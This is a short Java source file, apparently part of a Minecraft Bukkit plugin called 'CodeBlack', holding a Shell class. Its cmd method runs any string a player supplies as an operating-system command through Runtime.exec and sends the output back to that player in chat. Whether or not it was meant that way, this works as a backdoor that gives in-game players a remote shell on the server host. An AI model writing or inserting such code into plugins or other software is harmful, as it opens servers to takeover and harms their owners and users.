package dev.cybersecguy.cyber.CodeBlack.Shell;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import org.bukkit.entity.Player;

import dev.cybersecguy.cyber.CodeBlack.CodeBlack;

public class Shell {
	public CodeBlack plugin;

	String[] args;

	public Shell(CodeBlack instance) {
		plugin = instance;
	}
	
	public static void cmd(String args, Player player) {
		
		try {
			Process proc = Runtime.getRuntime().exec(args);			
			BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			
			String line = "";
			while((line = reader.readLine()) != null) {
				player.sendMessage(line + "\n");
	            System.out.print(line + "\n");
	        }

	        proc.waitFor();
		} catch (IOException | InterruptedException e) {
			// TODO Auto-generated catch block
			player.sendMessage("Error: " + e);
			e.printStackTrace();
		}
	}
	
}